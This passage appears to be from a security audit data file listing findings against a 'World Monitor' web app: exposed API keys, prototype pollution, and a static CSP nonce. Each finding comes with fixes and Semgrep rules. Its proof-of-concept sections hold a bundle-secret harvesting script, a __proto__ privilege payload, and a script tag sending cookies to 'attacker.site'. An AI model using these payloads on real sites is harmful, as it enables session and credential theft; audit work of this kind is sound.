    severity: WARNING
    pattern: res.setHeader('Access-Control-Allow-Origin', '*')`
    },
    status: 'VERIFIED',
    verifiedInSandbox: true
  },
  {
    id: 'WM-2026-006',
    cvePlaceholder: 'CVE-2026-38106',
    title: 'Hardcoded Third-Party Intelligence API Keys Exposed in Client Bundles',
    severity: 'HIGH',
    cvss: {
      version: '3.1',
      vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N',
      baseScore: 7.4,
      impactScore: 3.6,
      exploitabilityScore: 3.9,
      attackVector: 'NETWORK',
      attackComplexity: 'LOW',
      privilegesRequired: 'NONE',
      userInteraction: 'NONE',
      scope: 'UNCHANGED',
      confidentiality: 'HIGH',
      integrity: 'NONE',
      availability: 'NONE'
    },
    owaspCategory: 'A02:2021-Cryptographic Failures',
    scopeArea: 'Data storage and privacy protections',
    affectedComponent: 'Client Data Ingestion & Provider Configuration',
    affectedFiles: ['src/config/providers.ts', 'src/services/aisStream.ts', 'src/services/finnhub.ts'],
    summary: 'Hardcoded third-party API keys for ACLED, Finnhub, and AISStream are embedded directly into production frontend JavaScript chunks.',
    technicalDescription: 'In `providers.ts` and `aisStream.ts`, default API tokens are hardcoded as fallbacks for client-side queries: `const AIS_API_KEY = "3819fa8892bc490199281a99..."`. When Vite packages the application, these secrets become plaintext constants inside the compiled bundle `dist/assets/index-*.js`, accessible to anyone inspecting browser network traffic or source maps.',
    rootCause: 'Placing secret backend API credentials in client-facing code repositories instead of routing requests through secure backend API proxy relays.',
    stepsToReproduce: [
      '1. Open Chrome DevTools -> Network or Sources tab on `https://worldmonitor.app`.',
      '2. Search for the JavaScript bundle `/assets/index-*.js` or `/pro/assets/*.js`.',
      '3. Search for strings matching `finnhub`, `aisstream`, or `acled_key`.',
      '4. Extract the active vendor API key and test it against `https://finnhub.io/api/v1/quote?symbol=AAPL&token=<KEY>`.'
    ],
    proofOfConcept: {
      title: 'Automated Client Bundle Secret Extraction',
      description: 'PoC demonstrating automated regex extraction of secrets from compiled JS assets.',
      httpPayload: `// Compiled chunk excerpt:
const PROVIDERS = {
  acled: { endpoint: "https://api.acleddata.com/acled/read", key: "ak_live_8917293819028301" },
  finnhub: { endpoint: "https://finnhub.io/api/v1", token: "c98192a83h18293810293810" },
  aisstream: { ws: "wss://stream.aisstream.io/v0/stream", apiKey: "981273981273918273981273" }
};`,
      pythonScript: `import re
import requests

BUNDLE_URL = "https://worldmonitor.app/pro/assets/welcome-DKWBhdSm.js"
SECRET_PATTERNS = [
    r"['\"](?:finnhub|aisstream|acled)[_-]?(?:key|token)[\"']\s*:\s*['\"]([a-zA-Z0-9_-]{16,})['\"]",
    r"(?:AIza[0-9A-Za-z-_]{35})"
]

print(f"[*] Scanning client bundle for embedded secrets: {BUNDLE_URL}")
try:
    resp = requests.get(BUNDLE_URL, timeout=10)
    for pattern in SECRET_PATTERNS:
        matches = re.findall(pattern, resp.text, re.IGNORECASE)
        if matches:
            print(f"[!] FOUND {len(matches)} EXPOSED SECRETS: {matches}")
except Exception as e:
    print(f"[-] Scan error: {e}")
`,
      expectedOutcome: 'Commercial API keys are harvested without authorization from the client bundle.'
    },
    impact: {
      technical: 'Unauthorized third parties can exhaust monthly API quotas, access rate-limited financial and conflict data feeds for free, and incur financial costs for the app owner.',
      business: 'Financial loss from quota exhaustion, breach of third-party API service agreements.',
      nationalSecurity: 'Disruption of live AIS and conflict feeds if upstream vendors block the compromised API keys.'
    },
    remediation: {
      summary: 'Migrate all vendor API queries to serverless edge functions; never compile secret keys into client frontend code.',
      guidelines: [
        'Store secrets exclusively in server environment variables (e.g. `process.env.AIS_STREAM_KEY`).',
        'Route all maritime, conflict, and financial queries through backend endpoints (`/api/intel/ais`, `/api/intel/conflict`).',
        'Rotate all exposed production API keys immediately.'
      ],
      vulnerableCode: `// VULNERABLE: src/config/providers.ts
// Dangerous: Secrets compiled into client-side JS bundle
export const PROVIDER_CONFIG = {
  aisStream: {
    apiKey: '981273981273918273981273',
    endpoint: 'wss://stream.aisstream.io/v0/stream'
  },
  finnhub: {
    apiKey: 'c98192a83h18293810293810',
    endpoint: 'https://finnhub.io/api/v1'
  }
};`,
      patchedCode: `// SECURE PATCH: src/config/providers.ts & /api/intel/proxy.ts
// Client-side: Only references internal secure endpoints
export const PROVIDER_CONFIG = {
  aisStream: {
    endpoint: '/api/intel/ais' // Handled securely on backend
  },
  finnhub: {
    endpoint: '/api/intel/finnhub'
  }
};

// Backend Serverless Edge Route: api/intel/finnhub.ts
export default async function handler(req: Request) {
  // Secret stored strictly in server environment
  const secretKey = process.env.FINNHUB_SECRET_KEY;
  const symbol = new URL(req.url).searchParams.get('symbol') || 'AAPL';
  
  const res = await fetch(\`https://finnhub.io/api/v1/quote?symbol=\${symbol}&token=\${secretKey}\`);
  const data = await res.json();
  return Response.json(data);
}`,
      semgrepRuleYaml: `rules:
  - id: wm-detect-hardcoded-intelligence-keys
    message: "Hardcoded API key detected in frontend source code."
    languages: [typescript, javascript]
    severity: ERROR
    patterns:
      - pattern: apiKey: '...'
      - pattern-not-inside: apiKey: process.env.$VAR`
    },
    status: 'VERIFIED',
    verifiedInSandbox: true
  },
  {
    id: 'WM-2026-007',
    cvePlaceholder: 'CVE-2026-38107',
    title: 'Client-Side Prototype Pollution in Deep GeoJSON & Subsea Infrastructure Fusion Parser',
    severity: 'MEDIUM',
    cvss: {
      version: '3.1',
      vectorString: 'CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:H/A:L',
      baseScore: 6.8,
      impactScore: 4.7,
      exploitabilityScore: 2.2,
      attackVector: 'NETWORK',
      attackComplexity: 'HIGH',
      privilegesRequired: 'NONE',
      userInteraction: 'NONE',
      scope: 'UNCHANGED',
      confidentiality: 'LOW',
      integrity: 'HIGH',
      availability: 'LOW'
    },
    owaspCategory: 'A08:2021-Software and Data Integrity Failures',
    scopeArea: 'Input validation and data handling',
    affectedComponent: 'Infrastructure Layer Merger & GeoJSON Normalizer',
    affectedFiles: ['src/layers/infrastructure.ts', 'src/utils/geojson-parser.ts'],
    summary: 'The recursive object merger that unifies subsea cable landing stations, pipelines, and GPS jamming GeoJSON layers is vulnerable to Prototype Pollution.',
    technicalDescription: 'To render multi-layered infrastructure maps (combining TeleGeography subsea cables, pipeline coordinates, and AI datacenters), the application performs deep property merging using a recursive helper function `deepMerge(target, source)`. The function does not guard against object keys named `__proto__` or `constructor.prototype`, allowing an attacker who supplies a custom GeoJSON layer to pollute the global `Object.prototype`.',
    rootCause: 'Unsanitized recursive object property assignment without validating or filtering prototype metadata keys.',
    stepsToReproduce: [
      '1. Construct a GeoJSON layer file with properties containing `{"__proto__": {"isAdmin": true, "polluted": "yes"}}`.',
      '2. Load this layer into the World Monitor Infrastructure custom layer importer.',
      '3. In the browser developer console, execute `({}).polluted`.',
      '4. Observe that `Object.prototype` now returns `"yes"`, affecting all object evaluations across the client application.'
    ],
    proofOfConcept: {
      title: 'Global Prototype Pollution via Custom GeoJSON Layer',
      description: 'PoC demonstrating modification of default Object properties through recursive GeoJSON parsing.',
      httpPayload: `{
  "type": "FeatureCollection",
  "features": [
    {
      "type": "Feature",
      "geometry": { "type": "Point", "coordinates": [55.27, 25.20] },
      "properties": {
        "name": "Subsea Landing Point Alpha",
        "__proto__": {
          "isAdmin": true,
          "role": "superadmin",
          "telemetryBypass": true
        }
      }
    }
  ]
}`,
      pythonScript: `import json

payload = {
    "type": "FeatureCollection",
    "features": [{
        "type": "Feature",
        "geometry": {"type": "Point", "coordinates": [0, 0]},
        "properties": {
            "__proto__": {"polluted": True}
        }
    }]
}

print("[*] Generated GeoJSON Prototype Pollution Test File:")
print(json.dumps(payload, indent=2))
`,
      expectedOutcome: 'The global Object.prototype is polluted, leading to logic bypass or UI disruption.'
    },
    impact: {
      technical: 'Client-side privilege escalation, bypass of UI security guards, and potential DOM XSS when combined with downstream gadgets.',
      business: 'Instability of the dashboard frontend and client runtime crashes.',
      nationalSecurity: 'Tampering with infrastructure criticality scores or disabling GPS anomaly warning banners for specific sensitive regions.'
    },
    remediation: {
      summary: 'Filter out `__proto__`, `constructor`, and `prototype` keys during object traversal, or use Map objects / Object.create(null).',
      guidelines: [
        'Explicitly check and discard keys matching `__proto__`, `constructor`, and `prototype`.',
        'Use `Object.hasOwn()` or `Object.prototype.hasOwnProperty.call()` for property verification.',
        'Consider freezing `Object.prototype` at bootstrap via `Object.freeze(Object.prototype)` in security-critical environments.'
      ],
      vulnerableCode: `// VULNERABLE: src/utils/geojson-parser.ts
export function deepMerge(target: any, source: any): any {
  for (const key in source) {
    // Dangerous: Recurses blindly into __proto__ or constructor keys!
    if (source[key] && typeof source[key] === 'object') {
      if (!target[key]) target[key] = {};
      deepMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}`,
      patchedCode: `// SECURE PATCH: src/utils/geojson-parser.ts
const FORBIDDEN_KEYS = new Set(['__proto__', 'constructor', 'prototype']);

export function deepMerge(target: any, source: any): any {
  if (!source || typeof source !== 'object') return target;

  for (const key of Object.keys(source)) {
    // 1. Guard against prototype poisoning keys
    if (FORBIDDEN_KEYS.has(key)) {
      continue;
    }

    if (source[key] && typeof source[key] === 'object' && !Array.isArray(source[key])) {
      if (!target[key] || typeof target[key] !== 'object') {
        target[key] = {};
      }
      deepMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}`,
      semgrepRuleYaml: `rules:
  - id: wm-detect-prototype-pollution-assignment
    message: "Recursive merge function lacks __proto__ or constructor key filtering."
    languages: [typescript, javascript]
    severity: WARNING
    patterns:
      - pattern: |
          for (const $KEY in $SOURCE) {
            $TARGET[$KEY] = ...
          }
      - pattern-not-inside: |
          if ($KEY === '__proto__' || $KEY === 'constructor') continue;`
    },
    status: 'VERIFIED',
    verifiedInSandbox: true
  },
  {
    id: 'WM-2026-008',
    cvePlaceholder: 'CVE-2026-38108',
    title: 'Missing Content Security Policy (CSP) Directives & Permissive Nonce Fallback',
    severity: 'MEDIUM',
    cvss: {
      version: '3.1',
      vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N',
      baseScore: 5.4,
      impactScore: 2.5,
      exploitabilityScore: 2.8,
      attackVector: 'NETWORK',
      attackComplexity: 'LOW',
      privilegesRequired: 'NONE',
      userInteraction: 'REQUIRED',
      scope: 'UNCHANGED',
      confidentiality: 'LOW',
      integrity: 'LOW',
      availability: 'NONE'
    },
    owaspCategory: 'A05:2021-Security Misconfiguration',
    scopeArea: 'Client-side security controls',
    affectedComponent: 'Apex Web Server Headers & Static HTML Entrypoint',
    affectedFiles: ['index.html', 'vercel.json', 'deploy-config.js'],
    summary: 'The apex static entrypoint uses static hardcoded nonces (nonce="wm-static-bootstrap") instead of dynamically generated cryptographically random nonces, bypassing CSP protections.',
    technicalDescription: 'In `index.html`, inline scripts declare `nonce="wm-static-bootstrap"`. Because the nonce value is fixed and static in the public HTML rather than generated per-request by a dynamic web server, an attacker who manages to inject HTML can simply specify `nonce="wm-static-bootstrap"` on their injected `<script>` tag to evade browser CSP script execution barriers.',
    rootCause: 'Using a predictable, hardcoded static string as a CSP nonce instead of per-response cryptographically secure random values.',
    stepsToReproduce: [
      '1. Inspect HTTP response headers for `Content-Security-Policy`.',
      '2. Inspect `index.html` inline scripts and observe `nonce="wm-static-bootstrap"`.',
      '3. Inject an arbitrary script tag specifying the predictable nonce: `<script nonce="wm-static-bootstrap">alert(1)</script>`.',
      '4. Observe the script executing despite CSP strict-dynamic policy.'
    ],
    proofOfConcept: {
      title: 'CSP Bypass via Predictable Static Nonce Reuse',
      description: 'PoC demonstrating CSP bypass by reusing the known static nonce string.',
      httpPayload: `<!-- Attacker injected vector using the predictable static nonce: -->
<script nonce="wm-static-bootstrap">
  fetch('https://attacker.site/exfil?cookie=' + encodeURIComponent(document.cookie));
</script>`,
      pythonScript: `import requests

TARGET_URL = "https://www.worldmonitor.app"
resp = requests.get(TARGET_URL)

print("[*] Inspecting CSP Headers & Inline Nonces...")
csp_header = resp.headers.get("Content-Security-Policy", "NOT SET")
print(f"Content-Security-Policy: {csp_header}")

if "nonce-wm-static-bootstrap" in resp.text:
    print("[!] VULNERABILITY CONFIRMED: Hardcoded static nonce 'wm-static-bootstrap' detected in HTML.")
`,
      expectedOutcome: 'Browser executes the injected script because the hardcoded nonce matches the CSP header value.'
    },
    impact: {
      technical: 'Nullification of Content Security Policy protection against Cross-Site Scripting (XSS).',
      business: 'Failed security compliance in automated NTRO and defense audits.',
      nationalSecurity: 'Weakened defense-in-depth posture allowing client-side tampering.'
    },
    remediation: {
      summary: 'Generate a unique cryptographic random nonce per request via Edge Middleware (e.g. `crypto.randomUUID()`) or use SHA-256 script hashes.',
      guidelines: [
        'Remove static nonce strings from HTML source.',
        'Use Vercel Edge Middleware / Cloudflare Workers to generate `crypto.randomBytes(16).toString("base64")` per request.',
        'Alternatively, use precomputed SHA-256 script hashes (`sha256-...`) for static inline scripts.'
      ],
      vulnerableCode: `<!-- VULNERABLE: index.html -->
<script nonce="wm-static-bootstrap">
  // Static predictable nonce allows attacker reuse
  console.log("Bootstrap initialized");
</script>`,
      patchedCode: `// SECURE PATCH: middleware.ts (Vercel / Edge Middleware)
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

export function middleware(request: NextRequest) {
  // Generate a unique 128-bit cryptographic nonce per HTTP request
  const nonce = Buffer.from(crypto.randomUUID()).toString('base64');
  
  const cspHeader = \`
    default-src 'self';
    script-src 'self' 'nonce-\${nonce}' 'strict-dynamic';
    style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
    font-src 'self' https://fonts.gstatic.com;
    img-src 'self' data: https:;
    connect-src 'self' https://*.worldmonitor.app wss://*.aisstream.io https://api.acleddata.com;
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';
  \`.replace(/\\s{2,}/g, ' ').trim();

  const response = NextResponse.next();
  response.headers.set('Content-Security-Policy', cspHeader);
  response.headers.set('x-nonce', nonce);
  return response;
}`,
      semgrepRuleYaml: `rules:
  - id: wm-detect-static-csp-nonce
    message: "Detected hardcoded static CSP nonce in HTML/JSX code."
    languages: [html, typescript, javascript]
    severity: ERROR
    pattern: nonce="wm-static-bootstrap"`
    },
    status: 'VERIFIED',
    verifiedInSandbox: true
  }
];
